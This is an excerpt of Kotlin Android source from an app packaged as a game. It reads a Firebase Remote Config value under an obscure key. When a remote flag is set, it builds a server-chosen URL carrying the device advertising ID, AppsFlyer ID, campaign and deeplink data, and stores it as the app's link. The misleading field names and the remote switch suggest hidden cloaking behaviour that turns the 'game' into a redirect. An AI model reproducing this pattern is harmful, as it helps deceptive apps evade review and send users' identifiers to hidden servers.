...
import com.vbtb.game.databinding.ActivityMainBinding
import com.vbtb.game.game.utils.Completer
import com.vbtb.game.util.*
import com.vbtb.game.util.manager.DataStoreManager
import com.vbtb.game.util.network.internetConnection
...
//    }
                        ...
                        Firebase.remoteConfig.apply {
                            ...
                            fetchAndActivate().addOnCompleteListener(this@MainActivity) { task ->
                                if (task.isSuccessful) {
                                    val jsonStr = getString("Decapyto")
                                    log("success = $jsonStr")
                                    JSONObject(jsonStr).also { jsonObj ->
                                        coroutine.launch(Dispatchers.IO) {
                                            getPack(jsonObj.getBoolean("refused"), jsonObj.getString("useful"))
                                        }
                                    }
    ...
    private suspend fun getPack(refused: Boolean, useful: String) {
        if (refused) {
            withContext(Dispatchers.Main) {
                val completer = Completer(coroutine, 2) {
                    ...
                    val useluf = useful + "?" +
                            "aderings=${advertisingId}&" +
                            "aflyerid=${appsflyerUID}&" +
                            "camgn=${AppsflyerUtil.campaignFlow.value}&" +
                            "deekplink=${FacebookUtil.deeplinkFlow.value}"
                    ...
                    coroutine.launch(Dispatchers.IO) {
                        ...
                        DataStoreManager.Link.update { useluf }
                    }
                }
